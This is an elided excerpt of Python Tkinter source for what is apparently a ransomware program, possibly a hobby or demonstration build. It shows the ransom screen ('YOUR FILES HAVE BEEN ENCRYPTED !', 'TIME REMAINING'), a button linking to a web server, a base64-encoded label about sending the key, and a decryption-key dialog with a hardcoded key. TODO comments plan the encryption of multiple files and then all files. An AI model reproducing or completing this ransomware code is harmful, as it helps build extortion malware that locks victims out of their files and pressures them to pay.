# TODO - 4) Encrypt Multiple files
# TODO - 5) Encrypt All files
...
class Form:
    ...
    def __init__(self, master):
        ...
        # Object Label 2
        self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !', bg="gray17", fg="GOLD", font=('bahnschrift', 12))
        ...
        self.label_time = Label(self.master, text='TIME REMAINING', bg="gray17", font=('bahnschrift', 12,)).place(x=10, y=300)
        ...
        self.b = Button(self.master, image=self.b_img, bg="gray17", borderwidth=5, relief="groove", command=web_server_link)
        ...
        self.label4 = Label(self.master, text="RW52b2lzIGRlIGxhIGNsZWY=", fg="snow", bg="gray17", font=('bahnschrift', 10))
    ...
    def toplevel(self):
        ...
        self.top_label = Label(self.top, text="Enter Decryption Key", fg="gold", bg="gray17", borderwidth=1, relief="raised", font=('bahnschrift', 10))
    ...
    def toplevel2(self):
        ...
        if self.user_input == "12345":
            ...
            try:
                ...
                os.remove("Encrypted_Data\Data_To_Encrypt.aes")
            except ValueError:
                print("Password Error [!]")
            self.top2.geometry('335x150')
            self.img_win = ImageTk.PhotoImage(Image.open(Win_Logo))
            self.img_Win_label = tk.Label(self.top2, image=self.img_win, bg="gray17")
            ...
            self.img_warn_label = tk.Label(self.top2, image=self.img_warn, bg="gray17")
